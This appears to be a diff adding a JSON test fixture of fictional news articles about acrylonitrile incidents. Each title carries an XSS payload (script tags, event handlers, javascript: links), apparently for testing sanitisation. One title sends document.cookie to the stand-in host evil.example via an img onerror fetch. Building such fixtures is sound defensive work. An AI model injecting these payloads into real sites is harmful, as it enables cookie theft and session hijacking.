@@ -1,0 +1,10 @@
+{
+ "_comment": "Articles piégés fictifs (docs/SPEC.md, section 13) : balises, scripts, gestionnaires d'événements, liens javascript.",
+ "articles": [
+  {"url": "https://xss-1.example/a", "title": "Acrylonitrile <script>alert(document.cookie)</script> plant fire", "seendate": "20261018T080000Z"},
+  {"url": "https://xss-2.example/b", "title": "Acrylonitrile <img src=x onerror=fetch('https://evil.example/'+document.cookie)> strike", "seendate": "20261018T080000Z"},
+  {"url": "https://xss-3.example/c", "title": "Acrylonitrile &lt;iframe src=javascript:alert(1)&gt; outage", "seendate": "20261018T080000Z"},
+  {"url": "https://xss-4.example/d", "title": "Acrylonitrile <a href=\"javascript:alert(1)\">clic</a> shortage", "seendate": "20261018T080000Z"},
+  {"url": "https://xss-5.example/e", "title": "Acrylonitrile <svg onload=alert(1)><style>body{display:none}</style> blast", "seendate": "20261018T080000Z"}
+ ]
+}
